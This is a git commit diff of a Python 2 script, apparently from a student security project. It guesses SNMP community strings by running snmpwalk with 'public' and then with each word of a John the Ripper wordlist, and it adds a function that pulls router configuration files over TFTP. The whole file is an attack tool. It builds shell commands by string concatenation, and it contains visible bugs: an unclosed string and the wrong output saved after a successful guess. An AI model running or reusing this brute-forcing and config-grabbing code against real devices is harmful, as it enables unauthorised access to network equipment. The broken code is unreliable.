56fca4ce026f25837f4fe3148397671a27df843f
tipparat umrod <tipparat.umrod@utexas.edu>
2016-04-29 09:57:15 -0500

    prep for snmpwalk, ftp, and output result to file

--- snmpwalk.py
+++ snmpwalk.py
@@ -1,31 +1,26 @@
 import os
 import commands
-network_dict = {'10.202.208.2': ['router.asus.com ', ['53/tcp open  domain', '80/tcp open  http', '161/tcp open snmp'], 'asdfsadfsaf', 'asdf asdfasdf', 'sdf 2.6.X', 'cpe:asdfsafsdf', 'asdfsadf', 'asdfas'], '10.202.208.1': ['router.asus.com ', ['53/tcp open  domain', '80/tcp open  http'], '10:BF:48:D3:93:B8 (Asustek Computer)', 'general purpose', 'Linux 2.6.X', 'cpe:/o:linux:linux_kernel:2.6', 'Linux 2.6.8 - 2.6.30', '1 hop']}
 
-#network_dict.contains(service)
-
-def main():
+def run_snmpwalk(ip):
     word_list = run_john("password.lst")
-    for ip in network_dict:
-        services = network_dict[ip][1]
+    cmnity_str = "public"
+    snmpwalk_public = "snmpwalk -v1 -c public " + ip
+    print snmpwalk_public
+    result_public = commands.getstatusoutput(snmpwalk_public)
 
-        for port in services:
-
-            if port.split("/")[0] == '161':
-                snmpwalk_public = "snmpwalk -v1 -c public " + ip
-                print snmpwalk_public
-                coutput = commands.getstatusoutput(snmpwalk_public)
-                
+    if("Timeout" not in result_public[1]):
+        print "successful--write to file--
+        write_to_file(ip+"-snmpwalk.txt",result_public[1])
+    else:
+        for word in word_list:
+            if "#" not in word:
+                snmpwalk_john = "snmpwalk -v1 -c " + word.rstrip() +" " + ip
+                coutput = commands.getstatusoutput(snmpwalk_john)
                 if("Timeout" not in coutput[1]):
-                    print "successful--do something--"
-                else:
-                    for word in word_list:
-                        if "#" not in word:
-                            snmpwalk_john = "snmpwalk -v1 -c " + word.rstrip() +" " + ip
-                            coutput = commands.getstatusoutput(snmpwalk_john)
-                            if("Timeout" not in coutput[1]):
-                                print "successful--do something--"
-                                break;
+                    print "successful--save community string--"
+                    cmnity_str = word
+                    write_to_file(ip+"-snmpwalk.txt", result_public[1])
+                    break;
 
 def run_john(john_list):
     #word_list = "/usr/share/john/"+ john_list
@@ -36,4 +31,11 @@ def run_john(john_list):
             words.append(line)
     return words
 
-main()
+def write_to_file(filename, output):
+    f = open(filename, 'w')
+    f.write(output)
+
+def get_router_confg(host, router_name):
+    cmd = "tftp " + host + " get " + router_name + "-confg"
+    confg = commands.getstatusoutput(cmd)
+    print confg[1]
